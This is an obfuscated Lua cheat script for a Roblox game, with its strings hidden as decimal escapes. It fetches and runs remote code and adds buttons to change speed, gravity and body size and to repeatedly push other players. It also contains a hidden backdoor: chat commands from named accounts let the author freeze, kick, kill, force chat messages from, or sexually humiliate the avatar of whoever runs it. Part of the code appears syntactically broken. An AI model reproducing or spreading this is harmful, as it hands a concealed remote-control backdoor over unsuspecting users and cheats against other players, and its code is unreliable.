local m = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")() local l = m:Window("\65\114\98\121\122\32\75\97\114\97\112\121\122\32\72\117\98") local f = l:Server("\65\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98", "") local j = f:Channel("\80\108\97\121\101\114") local n = f:Channel("\67\114\101\100\105\116\115") local k = f:Channel("\80\117\115\104\32\97\117\114\97") n:Label("\65\112\54\121\101\50\35\48\48\48\49") n:Button("\68\105\115\99\111\114\100", function() setclipboard("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\90\110\77\68\117\118\87\65\85\77") end) j:Button("\72\101\97\100\108\101\115\115", function() game.Players.LocalPlayer.Character.Head.Transparency = 1 game.Players.LocalPlayer.Character.Head.face:Remove () end) j:Button("\65\110\116\105\32\65\100\109\105\110", function() print("\110\111\116\32\119\111\114\107\105\110\103") end) j:Button("\66\105\103\72\101\97\100\40\110\101\101\100\32\99\105\116\121\32\108\105\102\101\32\119\111\109\97\110\41", function() for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetChildren()) do   if string.find(v.Name,"\83\99\97\108\101") and v.Name ~= "\72\101\97\100\83\99\97\108\101" then repeat wait(HeadGrowSpeed) until game.Players.LocalPlayer.Character.Head:FindFirstChild("\79\114\105\103\105\110\97\108\83\105\122\101") game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy() v:Destroy() game.Players.LocalPlayer.Character.Head:WaitForChild("\79\114\105\103\105\110\97\108\83\105\122\101") end) j:Button("\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100 m:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) j:Button("\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1 m:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\111\110", "\79\107\97\121\33") end) j:Button("\85\110\87\97\108\107\83\112\101\101\100", function() game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 m:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\87\97\108\107\83\112\101\101\100\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) k:Button("\80\117\115\104\32\97\117\114\97\40\110\101\101\100\32\103\97\109\101\112\97\115\115\41", function() for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end while task.wait(1) do pcall( function() for i, v in pairs(game.Players:GetPlayers()) do if v.Name == game.Players.LocalPlayer.Name then wait(.1) local b_ = { [2] = game:GetService("\80\108\97\121\101\114\115")[v.Name].Character } game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Push.PushTool:FireServer(unpack(b_)) end end end ) end end) k:Button("\65\110\116\105\32\82\97\103\100\111\108\108", function() game.Players.localPlayer.Character.Pushed:Remove () game.Players.localPlayer.Character.RagdollMe:Remove () for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end end) k:Button("\80\117\115\104\32\97\108\108\40\110\101\101\100\32\103\97\109\101\112\97\115\41", function() for i, v in pairs(game.Workspace:GetDescendants()) do if string.find(v.Name, "\82\97\103\100\111\108\108") then v:Destroy() end end game.Workspace.Gravity = math.huge while task.wait(.2) do pcall( function() for i, v in pairs(game.Players:GetPlayers()) do if v.Name == game.Players.LocalPlayer.Name then else game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0) wait(.1) local b_ = { [1] = game:GetService("\80\108\97\121\101\114\115")[v.Name].Character } game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Push.PushTool:FireServer(unpack(b_)) end end end ) end end) j:Button("\83\109\97\108\108\32\83\105\122\101", function() local p = game:GetService("\80\108\97\121\101\114\115").LocalPlayer local h = p.Character local e = h:FindFirstChildOfClass("\72\117\109\97\110\111\105\100") local function b() for i,v in pairs(h:GetDescendants()) do if v:IsA("\66\97\115\101\80\97\114\116") then if v.Name ~= "\72\101\97\100" then for i,cav in pairs(v:GetDescendants()) do if cav:IsA("\65\116\116\97\99\104\109\101\110\116") then if cav:FindFirstChild("\79\114\105\103\105\110\97\108\80\111\115\105\116\105\111\110") then cav.OriginalPosition:Destroy() end end end v:FindFirstChild("\79\114\105\103\105\110\97\108\83\105\122\101"):Destroy() if v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101") then v:FindFirstChild("\65\118\97\116\97\114\80\97\114\116\83\99\97\108\101\84\121\112\101"):Destroy() end end end end end b() wait(0.5) e:FindFirstChild("\66\111\100\121\84\121\112\101\83\99\97\108\101"):Destroy() wait(1) b() wait(0.5) e:FindFirstChild("\66\111\100\121\87\105\100\116\104\83\99\97\108\101"):Destroy() wait(1) b() wait(0.5) e:FindFirstChild("\66\111\100\121\68\101\112\116\104\83\99\97\108\101"):Destroy() wait(1) b() wait() m:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\83\109\97\108\108\32\83\105\122\101\32\116\117\114\110\32\111\110", "\79\107\97\121\33") end) j:Button("\85\110\70\117\110\110\121\32\71\114\97\118\105\116\121", function() game.Workspace.Gravity = 1000 m:Notification("\78\111\116\105\102\105\99\97\116\105\111\110", "\70\117\110\32\71\114\97\118\105\116\121\32\116\117\114\110\32\111\102\102", "\79\107\97\121\33") end) local g = game.Players.Oxmilk1 local g  = game.Players.Ap6ye2 local o = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true  end  local a = function() game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false end  g.Chatted:Connect(function(i) if i:match("\46\102\114\101\101\122\101") then if game.Players.LocalPlayer ~= g then o()  end end end) g.Chatted:Connect(function(i) if i:match("\46\117\110\102\114\101\101\122\101") then if game.Players.LocalPlayer ~= g then a()  end end end) g.Chatted:Connect(function(i) if game.Players.LocalPlayer ~= g   then if i:match("\46\107\105\99\107") then game.Players.LocalPlayer:Kick("\89\111\117\32\119\101\114\101\32\107\105\99\107\101\100\32\98\101\99\97\117\115\101\32\116\104\105\115\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98")  end end end)  g.Chatted:Connect(function(i) if i:match("\46\98\101\110\120") then if game.Players.LocalPlayer ~= g then  wait(0) local eh = "\115\111\114\114\121\32\105\109\32\117\115\101\32\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98" local s = "\65\108\108" local gs = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest gs:FireServer(eh, s) game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = g.Character.HumanoidRootPart local q = true while q == true do local iq = game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Character.Humanoid pcall(function() iq.Parent.Pants:Destroy() end) pcall(function() iq.Parent.Shirt:Destroy() end) game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100").Sit = true game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = g.Character.HumanoidRootPart.CFrame + g.Character.HumanoidRootPart.CFrame.lookVector * 0.5 game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 70 wait(0.1) game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * -200 end end end end)  g.Chatted:Connect(function(i) if i:match("\46\107\105\108\108") then if game.Players.LocalPlayer ~= g  then game.Players.LocalPlayer.Character.Head:Destroy() end end end)  g.Chatted:Connect(function(i) if i:match("\46\98\97\110") then if game.Players.LocalPlayer ~= g then game.Players.LocalPlayer:Kick("\80\69\82\77\65\32\66\65\78") end end end)  g.Chatted:connect(function(i) if i:match("\46\98\114\105\110\103") then if game.Players.LocalPlayer ~= g then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(g.Character.UpperTorso.Position) end end end)  g.Chatted:connect(function(i) if i:match("\46\102\108\105\110\103") then if game.Players.LocalPlayer ~= g then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0) local pb = 99999  game:GetService('RunService').Stepped:connect(function() game.Players.LocalPlayer.Character.Head.CanCollide = false game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end) wait(.1) local hp = Instance.new("\66\111\100\121\84\104\114\117\115\116") hp.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart hp.Force = Vector3.new(pb,0,pb) hp.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position end end end)  g.Chatted:Connect(function(i) if i:match("\46\115\97\121") then if game.Players.LocalPlayer ~= g then  wait() local eh = "\97\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98\32\116\111\112" local s = "\65\108\108" local gs = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest gs:FireServer(eh, s) end end end) g.Chatted:Connect(function(i) if game.Players.LocalPlayer ~= g  then if i:match("\46\99\111\101\109\115") then wait() local eh = "\111\104\32\121\101\97\32\105\109\32\108\111\118\101\32\99\111\101\109\115\32\99\111\101\109\115\32\99\111\101\109\115\32\105\32\108\111\118\101\32\99\111\101\109\115" local s = "\65\108\108" local gs = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest gs:FireServer(eh, s) end end end) g.Chatted:connect(function(i) if i:match("\46\117\110\98\101\110\120") then if game.Players.LocalPlayer ~= g then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0) local pb = 99999  game:GetService('RunService').Stepped:connect(function() game.Players.LocalPlayer.Character.Head.CanCollide = false game.Players.LocalPlayer.Character.UpperTorso.CanCollide = false game.Players.LocalPlayer.Character.LowerTorso.CanCollide = false game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false end) wait(.1) local hp = Instance.new("\66\111\100\121\84\104\114\117\115\116") hp.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart hp.Force = Vector3.new(pb,0,pb) hp.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position end end end)  g.Chatted:Connect(function(i) if game.Players.LocalPlayer ~= g  then if i:match("\46\115\99\114\105\112\116") then wait() local eh = "\115\99\114\105\112\116\32\110\97\109\101\32\65\114\98\121\122\32\107\97\114\97\112\121\122\32\104\117\98\32\116\104\105\115\32\118\101\114\121\32\99\111\111\108\32\115\99\114\105\112\116" local s = "\65\108\108" local gs = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest gs:FireServer(eh, s) end end end) 
